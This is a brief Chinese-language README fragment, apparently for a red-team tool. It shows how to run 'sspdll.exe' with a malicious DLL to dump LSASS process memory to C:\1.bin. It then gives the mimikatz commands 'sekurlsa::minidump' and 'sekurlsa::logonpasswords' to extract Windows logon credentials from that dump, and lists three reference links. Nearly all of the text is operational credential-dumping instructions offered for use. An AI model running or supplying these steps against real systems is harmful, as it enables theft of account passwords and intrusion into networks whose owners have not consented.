用法: sspdll.exe evil.dll
默认存储在C:\1.bin

下载到本地之后使用mimikatz:

```
sekurlsa::minidump 1.bin
sekurlsa::logonpasswords
```

* <https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/>
* <https://lengjibo.github.io/lassdump/>
* <https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e>

